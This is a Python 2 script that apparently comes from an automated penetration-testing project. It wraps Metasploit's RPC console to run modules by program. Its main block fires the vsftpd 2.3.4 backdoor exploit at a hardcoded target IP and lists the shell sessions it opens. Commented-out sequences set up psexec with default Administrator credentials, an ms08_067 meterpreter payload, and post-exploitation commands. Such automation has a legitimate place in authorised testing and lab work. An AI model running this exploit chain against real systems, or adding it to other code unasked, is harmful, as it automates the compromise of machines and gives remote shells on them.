# #apt2 from 


#!/usr/bin/env python
import time
# from nmapExp import HOST_CHECK
import msfrpc2 as msfrpc
from threading import Lock

class myMsf():
    lock = Lock()

    def __init__(self, host="127.0.0.1", port="55552", user="msf", password="abc123", uri="/api/", ssl=False,
                 createWorkspace=True):
        self.host = host
        self.port = port
        self.user = user
        self.password = password
        self.uri = uri
        self.ssl = ssl
        self.workspace = ""
        self.id = None
        self.authenticated = False
        self.conn = None

        self._connect(host=self.host, port=self.port, uri=self.uri, ssl=self.ssl)
        self._login(user=self.user, password=self.password)
        self._initConnection(createWorkspace)

    def _connect(self, host="127.0.0.1", port="55552", uri="/api/", ssl=False):
        self.conn = msfrpc.Msfrpc({'host': host, 'port': port, 'uri': uri, 'ssl': ssl})

    def _login(self, user="msf", password="msf"):
        self.authenticated = False
        try:
            res = self.conn.login(user=user, password=password)
            self.authenticated = True
        except Exception as e:
            pass
            # print e

    def _initConnection(self, createWorkspace=True):
        if (not self.authenticated):
            return ""

        self.execute("set THREADS 10\n")

        if (createWorkspace):
            self.createWorkspace("autopentest")
            self.execute("workspace autopentest\n")

        self.getResult()

    def _getConsoleId(self):
        if (not self.authenticated):
            return ""

        if (not self.id):
            console = self.conn.call('console.create', opts=[])
            if ('id' in console):
                self.id = console['id']
                print' id of console is *********'+self.id
            else:
                print "FAILED!!!"
        return self.id

    def isAuthenticated(self):
        return self.authenticated

    def createWorkspace(self, workspace):
        if (not self.authenticated):
            return ""

        if (not self.id):
            self._getConsoleId()

        self.workspace = workspace

        result = self.conn.call('console.write', [self.id, "workspace -a %s\n" % self.workspace])
        self.conn.call('console.write', [self.id, "workspace %s\n" % self.workspace])
        self.sleep(1)

        return result

    def execute(self, cmd):
        if (not self.authenticated):
            return ""

        if (not self.id):
            self._getConsoleId()

        result = "nothing "

        if (self.id):
            result = self.conn.call('console.write', [self.id, cmd])
            self.sleep(2)

        return result

    def sleep(self, sec):
        if (not self.authenticated):
            return ""

        time.sleep(sec)
        return

    def getResult(self):
        if (not self.authenticated):
            return ""

        result = ""
        if (self.id):
            while True:
                res = self.conn.call('console.read', [self.id])
                if res and 'data' in res:
                    if len(res['data']) > 1:
                        result += res['data']

                if res and 'busy' in res:
                    if res['busy'] == True:
                        self.sleep(1)
                        continue

                break
        return result

    def cleanup(self):
        if (not self.authenticated):
            return ""

        if (self.id):
            result = self.conn.call('console.destroy', [self.id])

        self.id = None
        return result


# -----------------------------------------------------------------------------
# main test code
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    target = "172.16.86.128"
    lhost  = "192.168.0.101"
    lport  = "4444"

    print" start myMsf"
    # connect to msfrpc
    msf = myMsf(host="127.0.0.1", port=55552, user="msf", password="abc123")

    msf.execute("use exploit/unix/ftp/vsftpd_234_backdoor\n")
    print msf.getResult()

    msf.execute("set RHOST %s\n" % target)
    print msf.getResult()
    
    # msf.execute("set LHOST %s\n" % lhost)
    # print msf.getResult()

    # msf.execute("ifconfig ")
    # print msf.getResult()
    
    # msf.execute("set LPORT %s\n" % lport)
    # print msf.getResult()
    
    msf.execute("exploit\n")
    print msf.getResult()
    msf.sleep(10)
    print 'first execute'
    # msf.execute("use exploit/windows/smb/psexec\n")
    # msf.execute("set RHOST %s\n" % target)
    # msf.execute("set SMBuser Administrator\n")
    # msf.execute("set SMBpass password\n")
    # msf.execute("exploit -z\n")


    # msf.execute("use exploit/windows/smb/ms08_067_netapi\n")
    # msf.execute("set TARGET 0\n")
    # msf.execute("set PAYLOAD windows/meterpreter/bind_tcp\n")
    # msf.execute("set LHOST 192.168.1.238\n")
    # msf.execute("set LPORT 11096\n")
    # msf.execute("set RPORT 445\n")
    # msf.execute("set RHOST 192.168.1.136\n")
    # msf.execute("set SMBPIPE BROWSER\n")
    # msf.execute("exploit -j\n")

    msf.sleep(5)
    print msf.getResult()
    
    msf.execute("sessions -i\n")
    msf.sleep(5)
    print msf.getResult()
    print'sdfasdfffffff'
    # msf.execute("sessions -i 2\n")
    # msf.execute("getuid\n")
    # msf.execute("sysinfo\n")
    # msf.execute("background\n")
    # print msf.getResult()

    msf.execute("sessions -i\n")
    msf.sleep(1)
    print msf.getResult()
